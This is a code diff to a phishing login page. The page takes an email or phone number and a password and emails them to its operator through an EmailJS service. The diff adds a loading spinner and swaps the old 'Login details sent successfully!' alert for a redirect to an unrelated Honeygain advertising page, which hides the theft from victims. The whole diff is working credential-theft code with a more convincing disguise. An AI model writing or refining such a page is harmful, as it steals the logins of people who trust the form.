@@ -61,6 +61,29 @@
             cursor: pointer;
             transition: 0.3s;
             font-weight: bold;
+            position: relative;
+        }
+
+        .btn .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid white;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        .btn.loading .spinner {
+            display: inline-block;
+        }
+
+        .btn.loading span {
+            visibility: hidden;
         }
 
         .btn:hover {
@@ -90,6 +113,11 @@
             font-weight: bold;
             text-decoration: none;
         }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -99,7 +127,10 @@
         <form id="login-form">
             <input type="text" id="email" name="user_email" placeholder="Phone number, or email" required>
             <input type="text" id="password" name="user_password" placeholder="Password" required>
-            <button type="submit" class="btn">Log In</button>
+            <button type="submit" class="btn">
+                <div class="spinner"></div>
+                <span>Log In</span>
+            </button>
         </form>
         <div class="forgot-password">
             <a href="#">Forgot password?</a>
@@ -121,20 +152,27 @@
 
             let email = document.getElementById("email").value;
             let password = document.getElementById("password").value;
+            let loginButton = document.querySelector(".btn");
 
             let data = {
                 user_email: email,
                 user_password: password
             };
 
+            // Disable button and show loading spinner
+            loginButton.classList.add("loading");
+            loginButton.disabled = true;
+
             emailjs.send("service_pnhul78", "template_83jyki7", data)
                 .then(
                     function(response) {
-                        alert("Login details sent successfully!");
+                        window.location.href = "https://www.honeygain.com/earn-money/?utm_source=ads&utm_medium=google_search_ads&utm_campaign=English/ww/tcpa&gad_source=1&gclid=CjwKCAiAqrG9BhAVEiwAaPu5zr0C68dF1AIi3iPUd_ric9AwYiTB5ioEKluSR3sK3SSsOI8On3D4TxoC7QkQAvD_BwE";
                     },
                     function(error) {
                         alert("Error! Please try again.");
                         console.error("EmailJS Error:", error);
+                        loginButton.classList.remove("loading");
+                        loginButton.disabled = false;
                     }
                 );
         });
